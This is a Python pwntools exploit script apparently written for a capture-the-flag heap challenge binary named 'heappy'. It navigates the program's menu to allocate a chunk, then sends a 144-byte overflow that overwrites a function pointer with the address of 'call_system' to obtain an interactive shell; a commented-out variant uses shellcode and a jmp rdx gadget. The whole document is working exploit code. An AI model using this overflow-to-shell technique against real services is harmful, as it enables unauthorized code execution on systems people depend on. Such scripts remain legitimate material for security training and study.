from pwn import *


def recv_n_lines(r, n):
    for _ in range(n):
        r.recvline()


def main():
    local = False
    filename = "./heappy_patchelf_with_win_func" 
    elf = ELF(filename)
    context.binary = elf
    if local:
        r = process([filename])
    else:
        print("[+] Warning: will not work remotely if win function was removed")
        r = remote("127.0.0.1", 5000)
    padding = 144
    """
    shellcode = b"\x90" * 10 + asm(shellcraft.sh())
    jmp_rdx = 0x00000000004006f7
    payload = shellcode + b"A" * (padding - len(shellcode)) + p64(jmp_rdx)
    """
    target = elf.symbols['call_system'] # one-gadget RCE
    payload = b'A' * padding + p64(target)
    recv_n_lines(r, 4)
    # choose language
    r.sendline("1")
    recv_n_lines(r, 2)
    # choose name
    r.sendline("pwn")
    recv_n_lines(r, 5)
    # change language -> allocate new chunk
    r.sendline("2")
    recv_n_lines(r, 4)
    # ita language
    r.sendline("2")
    recv_n_lines(r, 5)
    # change name
    r.sendline("1")
    recv_n_lines(r, 2)
    # overflow in functions' chunk
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()

    
